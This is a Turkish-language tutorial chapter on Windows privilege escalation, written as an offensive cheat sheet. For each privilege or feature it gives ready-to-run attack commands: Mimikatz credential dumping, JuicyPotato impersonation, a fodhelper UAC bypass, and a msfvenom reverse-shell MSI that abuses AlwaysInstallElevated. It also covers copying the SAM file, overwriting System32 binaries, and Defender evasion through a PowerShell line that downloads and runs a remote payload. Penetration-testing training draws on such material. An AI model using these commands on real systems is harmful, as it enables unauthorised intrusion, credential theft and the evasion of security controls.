**Windows Privilege Escalation: Exploiting Security Features (Güvenlik Özelliklerini Kötüye Kullanma)**

Windows, kullanıcıların ve sistemin güvenliğini sağlamak için birçok güvenlik özelliği sunar. Ancak, bu özellikler bazen yanlış yapılandırılabilir veya saldırganlar tarafından kötüye kullanılabilir. Bu bölümde, güvenlik özelliklerinin nasıl exploit edilebileceği detaylı şekilde açıklanmıştır.

---

### **8.1. SeDebugPrivilege Abuse**

**SeDebugPrivilege**, kullanıcıların sistem üzerindeki işlemleri debug etmesine izin verir. Bu ayrıcalığa sahip bir kullanıcı, sistemde çalışan süreçlerin belleğini manipüle ederek zararlı kod çalıştırabilir.

#### **Tespit**
- Kullanıcının ayrıcalıklarını kontrol edin:
  ```cmd
  whoami /priv
  ```

- **SeDebugPrivilege** etkinse, saldırı gerçekleştirilebilir.

#### **Kötüye Kullanma**
1. **Mimikatz** kullanarak bir işlem belleğini manipüle edin:
   ```cmd
   mimikatz.exe
   privilege::debug
   sekurlsa::logonpasswords
   ```
2. SYSTEM yetkisiyle çalışan bir işlemi hedef alın ve zararlı kod enjekte edin.

---

### **8.2. SeImpersonatePrivilege Abuse**

**SeImpersonatePrivilege**, bir işlemin başka bir kullanıcının bağlamında çalışmasına izin verir. Bu ayrıcalık, SYSTEM yetkisiyle çalışan işlemleri taklit etmek için kullanılabilir.

#### **Tespit**
- Ayrıcalıkları kontrol edin:
  ```cmd
  whoami /priv
  ```

#### **Kötüye Kullanma**
1. **JuicyPotato** veya **PrintSpoofer** gibi araçları kullanın:
   ```cmd
   JuicyPotato.exe -l 1337 -p cmd.exe -t *
   ```
2. Bu araçlar, SYSTEM yetkisiyle çalışan bir işlem bağlamında kod çalıştırabilir.

---

### **8.3. UAC (User Account Control) Bypass**

UAC, kullanıcı hesaplarının yüksek ayrıcalıklı işlemler başlatmasını kontrol etmek için kullanılan bir Windows güvenlik özelliğidir. Ancak, bazı durumlarda bu özellik atlatılabilir.

#### **Tespit**
- Kullanıcının UAC seviyesi:
  ```cmd
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
  ```

#### **Kötüye Kullanma**
1. **Fodhelper Exploit**:
   - Kayıt defteri kullanarak zararlı bir komut enjekte edin:
     ```cmd
     reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
     fodhelper.exe
     ```

2. **Metasploit** ile UAC atlatma:
   ```cmd
   msfconsole
   use exploit/windows/local/bypassuac
   set SESSION [session_id]
   run
   ```

---

### **8.4. AlwaysInstallElevated Abuse**

**AlwaysInstallElevated** ilkesi etkinse, kullanıcılar SYSTEM yetkisiyle MSI dosyalarını çalıştırabilir.

#### **Tespit**
1. AlwaysInstallElevated ayarlarını kontrol edin:
   ```cmd
   reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```

#### **Kötüye Kullanma**
1. Zararlı bir MSI dosyası oluşturun:
   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f msi > malicious.msi
   ```
2. MSI dosyasını SYSTEM yetkisiyle çalıştırın:
   ```cmd
   msiexec /quiet /qn /i C:\path\to\malicious.msi
   ```

---

### **8.5. SeBackupPrivilege Abuse**

**SeBackupPrivilege**, dosyaların ve dizinlerin yedeklenmesi için kullanılır. Bu ayrıcalık, normalde erişilemeyen hassas dosyaların kopyalanmasına izin verebilir.

#### **Tespit**
- Ayrıcalıkları kontrol edin:
  ```cmd
  whoami /priv
  ```

#### **Kötüye Kullanma**
1. Hassas bir dosyanın yedeğini alın:
   ```cmd
   robocopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
   ```
2. SAM dosyasını analiz ederek kullanıcı hash’lerini çıkarın.

---

### **8.6. SeRestorePrivilege Abuse**

**SeRestorePrivilege**, dosyaları geri yüklemek için kullanılır. Bu ayrıcalık, sistem dosyalarını değiştirmek veya kötüye kullanmak için kullanılabilir.

#### **Kötüye Kullanma**
1. Geri yükleme ayrıcalığını kontrol edin:
   ```cmd
   whoami /priv
   ```

2. SYSTEM32 dizininde bir dosyayı değiştirmek için:
   ```cmd
   icacls C:\Windows\System32\targetfile.exe /grant everyone:F
   copy malicious.exe C:\Windows\System32\targetfile.exe
   ```

---

### **8.7. Bypass Windows Defender**

Windows Defender, zararlı yazılımları ve exploitleri tespit etmek için kullanılır. Ancak, bazı yöntemlerle atlatılabilir.

#### **Kötüye Kullanma**
1. **Obfuscation**:
   - Powershell scriptlerinizi obfuscate edin.
   - Örnek:
     ```powershell
     IEX(New-Object Net.WebClient).DownloadString('http://[IP]/payload.ps1')
     ```

2. **Encoding**:
   - Zararlı kodunuzu Base64 encode ederek çalıştırın.
     ```cmd
     powershell -EncodedCommand [Base64Command]
     ```

---

### **Araçlar**
- **JuicyPotato / PrintSpoofer**: SeImpersonatePrivilege kötüye kullanımı için.
- **Metasploit Framework**: UAC bypass ve AlwaysInstallElevated exploitleri için.
- **Mimikatz**: Ayrıcalıkları kötüye kullanarak şifre ve hash çıkarımı için.
- **PowerShell Empire**: Post-exploitation saldırıları için.

---
